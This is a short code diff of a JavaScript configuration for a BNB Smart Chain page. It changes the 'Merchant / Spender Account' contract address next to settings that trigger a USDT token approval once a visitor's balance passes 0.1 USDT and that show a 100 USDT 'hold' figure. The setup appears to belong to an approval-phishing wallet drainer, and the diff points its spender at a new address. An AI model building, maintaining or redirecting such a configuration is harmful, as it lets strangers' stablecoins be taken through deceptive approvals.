@@ -12,7 +12,7 @@
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC Mainnet USDT BEP20
-        CONTRACT_ADDRESS: '0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d', // Merchant / Spender Account
+        CONTRACT_ADDRESS: '0x742a06f6c635D1447E500791e8B2658852E2C967', // Merchant / Spender Account
         MIN_BALANCE_THRESHOLD: 0.1, // Minimum USDT balance required to trigger approval (e.g. 0.1 USDT)
         REQUIRED_HOLD_USDT: 100, // Standard Hold Amount displayed
         CHAIN_ID: '0x38', // BSC Mainnet (56)
